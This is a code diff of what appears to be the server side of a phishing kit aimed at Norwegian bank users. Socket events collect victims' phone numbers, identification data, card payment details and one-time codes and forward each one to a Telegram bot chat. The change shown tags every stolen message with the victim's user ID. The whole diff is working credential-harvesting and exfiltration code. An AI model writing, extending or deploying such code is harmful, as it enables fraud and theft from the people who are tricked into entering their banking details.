@@ -16,7 +16,7 @@ const CHAT_ID = '-4550837464';
 
 
 
-async function sendToTelegram(data) {
+async function sendToTelegram(data, userId) {
     const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
     // Prepare the message
@@ -32,6 +32,11 @@ async function sendToTelegram(data) {
         message = `ℹ️ ${data}`;
     }
 
+    // Append the userId to the message
+    if (userId) {
+        message = `👤 *UserID*: ${userId}\n` + message;
+    }
+
     try {
         const response = await axios.post(telegramApiUrl, {
             chat_id: CHAT_ID,
@@ -44,7 +49,6 @@ async function sendToTelegram(data) {
         console.error('Error sending message:', error.message);
     }
 }
-
 const corsOptions = {
     origin: '*', 
     methods: ['GET', 'POST'], 
@@ -103,7 +107,7 @@ io.on('connection', (socket) => {
     })
 
     socket.on('phoneNumber', (data) => {
-        sendToTelegram(data)
+        sendToTelegram(data,userId)
         console.log('Received login data from client:', data);
 
 
@@ -111,7 +115,7 @@ io.on('connection', (socket) => {
 
     socket.on('sifferNumber', (data) => {
   
-        sendToTelegram(data)
+        sendToTelegram(data,userId)
         console.log('Received login data from client:', data);
         if (connectedUsers[userId]) {
             connectedUsers[userId].currentPage = "card page";
@@ -124,7 +128,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('Identifisering', (data) => {
-        sendToTelegram(data)
+        sendToTelegram(data,userId)
         console.log('Received login data from client:', data);
 
 
@@ -132,7 +136,7 @@ io.on('connection', (socket) => {
 
     socket.on('submitPayment', (data) => {
     
-        sendToTelegram(data)
+        sendToTelegram(data,userId)
         console.log('Received login data from client:', data);
 
         if (connectedUsers[userId]) {
@@ -146,7 +150,7 @@ io.on('connection', (socket) => {
 
     
     socket.on('Engangskode', (data) => {
-        sendToTelegram(data)
+        sendToTelegram(data,userId)
         console.log('Received login data from client:', data);
 
 
